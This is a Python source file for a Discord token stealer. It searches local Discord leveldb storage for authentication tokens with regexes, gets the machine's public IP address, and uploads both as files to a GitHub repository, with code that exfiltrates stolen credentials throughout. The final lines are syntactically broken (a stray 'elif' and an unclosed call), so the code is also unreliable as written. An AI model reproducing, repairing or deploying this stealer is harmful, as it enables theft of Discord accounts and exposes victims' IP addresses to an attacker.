import os
import re
import json
import requests
import subprocess
from datetime import datetime

def find_discord_tokens():
    tokens = []
    paths = [
        os.path.join(os.getenv('LOCALAPPDATA'), 'Discord', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb'),
    ]

    for path in paths:
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(os.path.join(path, file_name), errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
    return list(set(tokens))

def get_ip_address():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        response.raise_for_status()
        return response.json()['ip']
    except requests.exceptions.RequestException as e:
        print(f"Error getting IP address: {e}")
        return None

def save_to_github_public(tokens, ip_address, github_token, repo_owner, repo_name):
    github_api_url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/contents'
    headers = {
        'Authorization': f'token {github_token}',
        'Accept': 'application/vnd.github.v3+json'
    }
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    tokens_filename = f'tokens_{timestamp}.txt'
    ip_filename = f'ip_address_{timestamp}.txt'
    commit_message = f'Add token and IP log - {timestamp}'

    try:
        # Upload tokens
        tokens_data = {'message': commit_message, 'content': '\n'.join(tokens).encode('utf-8').decode('utf-8')}
        tokens_url = f'{github_api_url}/{tokens_filename}'
        response_tokens = requests.put(tokens_url, headers=headers, data=json.dumps(tokens_data))
        response_tokens.raise_for_status()
        print(f"Tokens successfully uploaded to public repo: {response_tokens.json()['content']['html_url']}")

        # Upload IP address
        ip_data = {'message': commit_message, 'content': (ip_address if ip_address else 'Could not retrieve IP address').encode('utf-8').decode('utf-8')}
        ip_url = f'{github_api_url}/{ip_filename}'
        response_ip = requests.put(ip_url, headers=headers, data=json.dumps(ip_data))
        response_ip.raise_for_status()
        print(f"IP address successfully uploaded to public repo: {response_ip.json()['content']['html_url']}")

    except requests.exceptions.RequestException as e:
        print(f"Error uploading to public Github repo: {e}")
        if e.response is not None:
            print(f"Github API Error: {e.response.status_code} - {e.response.json()}")

if __name__ == "__main__":
    tokens = find_discord_tokens()
    ip_address = get_ip_address()

    if tokens:
        print("Found Discord Tokens:")
        for token in tokens:
            print(token)
    else:
        print("No Discord tokens found.")

    if ip_address:
        print(f"User IP Address: {ip_address}")
    else:
        print("Could not retrieve IP address.")

 
    github_personal_access_token = " "
    github_repo_owner = "Syxfer" # 
    github_repo_name = "mal_dis_ip_tsmalann_syxfer" 


    elif tokens or ip_address:
        save_to_github_public(tokens, ip_address, github_personal_access_token, github_repo_owner, github_repo_name
